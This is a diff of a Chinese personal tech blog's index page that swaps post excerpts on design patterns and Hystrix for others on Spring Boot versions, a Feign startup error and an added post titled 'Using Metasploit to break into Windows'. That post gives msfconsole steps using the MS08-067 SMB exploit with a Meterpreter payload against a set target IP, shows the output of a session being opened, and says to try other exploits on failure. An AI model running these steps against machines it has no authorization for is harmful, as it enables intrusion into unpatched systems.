@@ -378,7 +378,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.wuxinvip.com/2018/03/24/design-pattern/establish/">
+    <link itemprop="mainEntityOfPage" href="http://www.wuxinvip.com/2018/03/24/hack/metasploit-hack-windows/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="无心">
@@ -397,8 +397,8 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/03/24/design-pattern/establish/" itemprop="url">
-                  设计模式-创建型
+                <a class="post-title-link" href="/2018/03/24/hack/metasploit-hack-windows/" itemprop="url">
+                  使用Metasploit入侵windows
                 </a>
               
             
@@ -428,22 +428,6 @@
             
 
             
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2018-10-14 12:53:47" itemprop="dateModified" datetime="2018-10-14T12:53:47+08:00">2018-10-14</time>
-              
-            
           </span>
 
           
@@ -472,7 +456,7 @@
 
           
           
-             <span id="/2018/03/24/design-pattern/establish/" class="leancloud_visitors" data-flag-title="设计模式-创建型">
+             <span id="/2018/03/24/hack/metasploit-hack-windows/" class="leancloud_visitors" data-flag-title="使用Metasploit入侵windows">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -505,22 +489,9 @@
       
         
           
-            <p>设计模式创建型–5种</p>
-<p>单例—-创建线程安全类</p>
-<p>工厂—-创建bean工厂</p>
-<p>抽象工厂—-创建bean工厂的工厂</p>
-<p>原型—-clone模式 —用于数据流转中对象快速复制</p>
-<p>建造者—创建bean类型多样组合-创建方式不变-依靠算法实现不同组合创建bean</p>
-<p><strong>单例</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Created by huoyan403 on 2017/8/14.</span><br><span class="line"> */</span><br><span class="line">public class Singleton &#123;</span><br><span class="line"></span><br><span class="line">    //防止被引用 赋值为null  目的实现延迟加载</span><br><span class="line">    private static Singleton singleton = null;</span><br><span class="line"></span><br><span class="line">    //私有化构造方法</span><br><span class="line">    private Singleton() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //静态工程方法 创建实例</span><br><span class="line">    public static Singleton getSingleton()&#123;</span><br><span class="line">        if(singleton == null)&#123;</span><br><span class="line">                    //synchronized关键字锁住的是这个对象，这样的用法，在性能上会有所下降，因为每次调用getInstance()，</span><br><span class="line">                    // 都要对对象上锁，事实上，只有在第一次创建对象的时候需要加锁，之后就不需要了</span><br><span class="line">            synchronized (singleton)&#123;</span><br><span class="line">                if(singleton == null) &#123;</span><br><span class="line">                    singleton = new Singleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return  singleton;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //如果该对象被用于序列化 可以保证在序列化前后保持一致</span><br><span class="line">    public Object readResolve()&#123;</span><br><span class="line">        return singleton;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><strong>工厂</strong></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/6434888-f8c880dfe1e8dad0.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="工厂模式_1.jpg"></p>
-<p><strong>抽象工厂</strong></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/6434888-74e3ecaccbeb4027.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="抽象工厂_2.jpg"></p>
-<p><strong>原型</strong></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/6434888-cf7bf5dbf48f4286.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="原型模式_4.jpg"></p>
-<p><strong>建造者</strong></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/6434888-0684b09801236edd.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="建造者_3.jpg"></p>
+            <p>使用msfconsole 查看window发布的漏洞</p>
+<p>运气好的话 你要破解的windows没有打补丁.那么使用该漏洞你就可以直接登陆到windows了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># msfconsole</span><br><span class="line"></span><br><span class="line">msf &gt; search platform: windows xp sp3</span><br><span class="line">msf &gt; search platform: windows 10</span><br><span class="line">msf &gt; search platform: android</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf &gt; info exploit/windows/smb/ms08_067_netapi</span><br><span class="line">使用info查看漏洞信息.</span><br><span class="line"></span><br><span class="line">msf &gt; use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">&gt; set payload windows/meterpreter/bind_tcp</span><br><span class="line">&gt; set RHOST 192.168.0.108  (设置目标主机IP地址)</span><br><span class="line">&gt; exploit</span><br><span class="line">设定攻击方式.攻击ip</span><br><span class="line"></span><br><span class="line">攻击成功:</span><br><span class="line">[*] Started bind handler</span><br><span class="line">[*] Automatically detecting the target...</span><br><span class="line">[*] Fingerprint: Windows XP SP3 - Service Pack 3 - lang:Chinese</span><br><span class="line">[*] Selected Target: Windows XP SP3 Chinese (AlwaysOn NK)</span><br><span class="line">[*] Attempting to trigger the vulnerability...</span><br><span class="line">[*] Sending stage (751104 bytes) to 192.168.0.108</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.0.1:41614 -&gt; 192.168.0.108:4444) at 2016-04-15 17:29:32</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br><span class="line"></span><br><span class="line">失败就尝试其他漏洞</span><br></pre></td></tr></table></figure>
 
           
         
@@ -578,7 +549,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.wuxinvip.com/2018/03/24/spring-cloud/Hystrix/">
+    <link itemprop="mainEntityOfPage" href="http://www.wuxinvip.com/2018/03/24/spring-boot/version-config/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="无心">
@@ -597,8 +568,8 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/03/24/spring-cloud/Hystrix/" itemprop="url">
-                  Hystrix
+                <a class="post-title-link" href="/2018/03/24/spring-boot/version-config/" itemprop="url">
+                  版本问题
                 </a>
               
             
@@ -628,22 +599,6 @@
             
 
             
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2018-10-14 12:53:46" itemprop="dateModified" datetime="2018-10-14T12:53:46+08:00">2018-10-14</time>
-              
-            
           </span>
 
           
@@ -672,7 +627,7 @@
 
           
           
-             <span id="/2018/03/24/spring-cloud/Hystrix/" class="leancloud_visitors" data-flag-title="Hystrix">
+             <span id="/2018/03/24/spring-boot/version-config/" class="leancloud_visitors" data-flag-title="版本问题">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -705,10 +660,13 @@
       
         
           
-            <p><strong>原理</strong></p>
-<p>1、流程图<br><img src="http://upload-images.jianshu.io/upload_images/6434888-009577c3c4e7377a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="官方原版流程图"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、方法标注 @HystrixCommand注解</span><br><span class="line">2、方法执行进入执行队列、方法执行、【图中标注 .toObservable()状态】</span><br><span class="line">3、缓存是否可见【有 返回缓存数据；没有进入下一步判断】</span><br><span class="line">4、断路器是否打开【未打开 直接判断信号量线程池是否拒绝 ；打开且触发断路进去fallback方法】</span><br><span class="line">5、信号量线程池是否拒绝【未拒绝 创建线程池隔离舱执行业务逻辑 ；拒绝 执行fallback方法】</span><br><span class="line">6、业务逻辑执行是否成功【成功 判断是否超时；未成功 执行fallback方法】</span><br><span class="line">7、判断是否超时【超时 不返回 未超时返回数据】</span><br><span class="line">8、fallback执行结果【成功 返回数据 ；失败 返回失败或者自行实现业务方法】</span><br><span class="line"></span><br><span class="line">其中方法执行结果要返回断路器健康状态给断路器【也就是图中绿色4】</span><br></pre></td></tr></table></figure></p>
-<p>具体信息可见官方详细：</p>
-<p><a href="https://github.com/Netflix/Hystrix/wiki/How-it-Works" target="_blank" rel="noopener">https://github.com/Netflix/Hystrix/wiki/How-it-Works</a></p>
+            <p>springboot 1.x</p>
+<p>server.context-path=/demo</p>
+<p>springboot 2.x</p>
+<p>server.servlet.context-path=/demo<br>不兼容了许多组建:sleuth.</p>
+<p>1.5的springboot 对各大开源组件兼容的版本比较低 比如es、</p>
+<p>因项目中使用es。5.X、spring-boot1.5兼容到4.X版本</p>
+<p>而springboot对es5.x的兼容是spring-boot2.0版本、干的项目里前后不能相顾、很尴尬。。</p>
 
           
         
@@ -766,7 +724,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.wuxinvip.com/2018/03/24/hack/about-hack/">
+    <link itemprop="mainEntityOfPage" href="http://www.wuxinvip.com/2018/03/24/spring-cloud-exception/feign-exception-1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="无心">
@@ -785,8 +743,8 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/03/24/hack/about-hack/" itemprop="url">
-                  关于漏洞和攻击
+                <a class="post-title-link" href="/2018/03/24/spring-cloud-exception/feign-exception-1/" itemprop="url">
+                  cloud feign灵异事件
                 </a>
               
             
@@ -816,22 +774,6 @@
             
 
             
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2018-10-14 12:53:47" itemprop="dateModified" datetime="2018-10-14T12:53:47+08:00">2018-10-14</time>
-              
-            
           </span>
 
           
@@ -860,7 +802,7 @@
 
           
           
-             <span id="/2018/03/24/hack/about-hack/" class="leancloud_visitors" data-flag-title="关于漏洞和攻击">
+             <span id="/2018/03/24/spring-cloud-exception/feign-exception-1/" class="leancloud_visitors" data-flag-title="cloud feign灵异事件">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -893,11 +835,12 @@
       
         
           
-            <p>看过一篇子电影 《没有绝对安全的系统》</p>
-<p>首先黑客是怎么攻击一个系统的呢？<br>一个系统又是怎么在黑客攻击下崩溃的？</p>
-<p>我的猜想：<br>1、任何系统都是有代码组成、这些系统都是为人服务，需要人为输入数据进行分析、<br>重点来了 那么这些数据有些就是正常数据、有些则可能是恶意数据、没有任何一个系统是不需要数据输入的、即便都是定制化属性有用户来进行选择、那么我们可以仿造代码进行替换、【语言这个东西又不是只有你一个人会】、<br>2、然后通过发送请求、测试请求信息、伪造一个请求信息、写成脚本<br>3、将请求脚本【也就是攻击脚本分发各个肉鸡】、由肉鸡进行攻击</p>
-<p>使用肉鸡的原因有几个<br>1、安全、不暴露攻击者本机ip【攻击时候作死：ping服务器不算】<br>2、数量可控、可针对不同系统吞吐量 控制不同数量的肉鸡进行攻击</p>
-<p>那么什么是恶意数据？<br>黑客们精心编制的一组数据、与业务代码中代码进行耦合、以早成运行器崩溃、虚拟机泄漏等等。或者早成无限循环等等</p>
+            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">报错 ：</span><br><span class="line">Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name &apos;dataSourceInitializerPostProcessor&apos;: Unsatisfied dependency expressed through field &apos;beanFactory&apos;; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name &apos;com.****.feign.UserCenterFeignService&apos;: Lookup method resolution failed; nested exception is java.lang.IllegalStateException: Failed to introspect Class [org.springframework.cloud.netflix.feign.FeignClientFactoryBean] from ClassLoader [sun.misc.Launcher$AppClassLoader@61e4705b]</span><br></pre></td></tr></table></figure>
+<p><img src="http://upload-images.jianshu.io/upload_images/6434888-7df99f9e93f72b12.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>解决办法 加入依赖</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6434888-c71a9b346663d6f5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原因未明 、创建项目时候导入了feign</span><br><span class="line">使用@EnableFeignClients注解 也ok 不报错 我就以为 feign包导入了  </span><br><span class="line">结果不知道哪来的包来的这个注解  导致 灵异事件</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6434888-55ccd9dddc1f19e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">严重怀疑是这个包里的</span><br><span class="line"></span><br><span class="line">mmp  莫名其妙的好了 仿佛又回到从前</span><br><span class="line">你对java 一无所知......</span><br></pre></td></tr></table></figure>
 
           
         
